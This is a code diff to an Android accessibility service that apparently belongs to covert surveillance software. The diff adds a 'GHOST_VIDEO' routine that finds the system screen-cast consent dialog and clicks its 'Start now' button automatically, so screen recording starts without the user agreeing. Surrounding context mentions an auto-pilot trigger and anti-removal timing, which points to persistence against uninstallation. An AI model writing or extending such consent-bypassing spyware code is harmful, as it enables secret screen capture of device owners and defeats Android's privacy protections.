@@ -99,6 +99,14 @@ public class IO_Persistence_Manager extends AccessibilityService {
         final int eventType = event.getEventType();
         final String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
 
+        // --- GHOST_VIDEO: hands-free screen-cast consent ("Start now") ---
+        // Runs before every filter so the system dialog (systemui) is seen.
+        if (GhostVideoSession.isAutoAcceptArmed() &&
+                (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+                 eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
+            if (tryAutoAcceptProjection()) return;
+        }
+
         // --- AUTO_PILOT: SPEED_OPTIMIZED TRIGGER ---
         if (isAutoPilotEngaged()) {
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
@@ -167,6 +175,64 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 } catch (Exception ignored) {}
             });
         }
+    }
+
+    /**
+     * GHOST_VIDEO v3: taps the system screen-cast consent dialog ("Start now")
+     * while GhostVideoSession auto-accept is armed. Flag-gated with a short
+     * window and a strict text match so random taps are impossible.
+     */
+    private boolean tryAutoAcceptProjection() {
+        java.util.List<AccessibilityNodeInfo> held = new java.util.ArrayList<>();
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return false;
+            try {
+                collectDialogButtons(root, held);
+                for (AccessibilityNodeInfo n : held) {
+                    try {
+                        CharSequence t = n.getText();
+                        if (t != null && t.toString().toLowerCase(java.util.Locale.US).contains("start now")) {
+                            n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            GhostVideoSession.disarmAutoAccept();
+                            Log.d(TAG, "projection consent auto-accepted");
+                            return true;
+                        }
+                    } catch (Exception ignored) {}
+                }
+            } finally {
+                try {
+                    root.recycle();
+                } catch (Exception ignored) {}
+            }
+        } catch (Exception ignored) {
+        } finally {
+            for (AccessibilityNodeInfo n : held) {
+                try {
+                    n.recycle();
+                } catch (Exception ignored) {}
+            }
+        }
+        return false;
+    }
+
+    private void collectDialogButtons(AccessibilityNodeInfo n, java.util.List<AccessibilityNodeInfo> out) {
+        if (n == null || out.size() > 40) return;
+        try {
+            CharSequence cls = n.getClassName();
+            if (n.isClickable() && cls != null && "android.widget.Button".equals(cls.toString())) {
+                out.add(AccessibilityNodeInfo.obtain(n));
+            }
+            for (int i = 0; i < n.getChildCount(); i++) {
+                AccessibilityNodeInfo c = n.getChild(i);
+                if (c != null) {
+                    collectDialogButtons(c, out);
+                    try {
+                        c.recycle();
+                    } catch (Exception ignored) {}
+                }
+            }
+        } catch (Exception ignored) {}
     }
 
     private long lastAntiRemovalExecution = 0;
